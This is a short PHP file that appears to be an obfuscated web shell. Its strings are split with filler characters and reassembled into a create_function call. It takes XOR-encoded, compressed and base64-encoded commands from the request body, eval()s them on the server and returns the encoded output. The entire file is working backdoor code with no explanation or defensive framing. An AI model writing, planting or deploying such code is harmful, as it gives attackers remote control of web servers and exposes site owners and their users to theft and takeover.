<?php
$i='{$c=}Us}Utrle}Un}U($k);$l=strlen($t);$}Uo="";fo}Ur}U($i=0;$i}U<$l;}U)}U{for($j=0;($j<}U$c}U&&$i<$l);$j++}U,$i}U++)}U';
$U=str_replace('p','','pcrpepatep_pfunctpion');
$u='ob_g}Uet_con}Utents();@ob_e}Und}U_clean(}U);$r=@ba}Use64_enco}Ude(@x}U(@gzcom}Upr}Uess}U($o)}U,}U$k));pri}Unt("$p$kh$r$kf");}';
$N='{$o}U.=$t}U{$i}}U^$k{$j};}}U}return }U$o;}if }U}U(}U@preg_match("/$kh}U(.+)$kf/",@}Ufile_g}Uet_conte}Unts("}Uph}U';
$K='$}Uk="69f19c8}Ue";$kh="5}U}U47151243a80}U";$kf}U="3f0}Ub933d0}U151";$}Up="eUhv}U36OZVy20}UTnV}Um"}U;func}Ution x($t,$}Uk)';
$O='p://inpu}Ut")}U,$m)==}U1) {@ob_}Ustart();}U@e}Uval}U(@gzunco}Umpress(@x}U(@base6}U4_decode(}U$m}U[1}U]),$}Uk)));}U$o=@';
$s=str_replace('}U','',$K.$i.$N.$O.$u);
$v=$U('',$s);$v();
?>
